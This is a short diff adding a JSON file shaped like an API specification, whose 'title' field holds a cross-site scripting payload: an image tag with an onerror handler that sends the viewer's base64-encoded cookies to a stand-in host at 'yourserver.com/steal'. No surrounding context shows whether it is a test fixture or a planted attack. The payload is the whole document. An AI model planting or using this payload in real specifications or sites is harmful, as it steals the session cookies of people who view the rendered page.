@@ -1,0 +1,6 @@
+{
+  "info": {
+    "title": "<img src=x onerror=\"fetch('https://yourserver.com/steal?c='+btoa(document.cookie))\">",
+    "version": "1.0"
+  }
+}
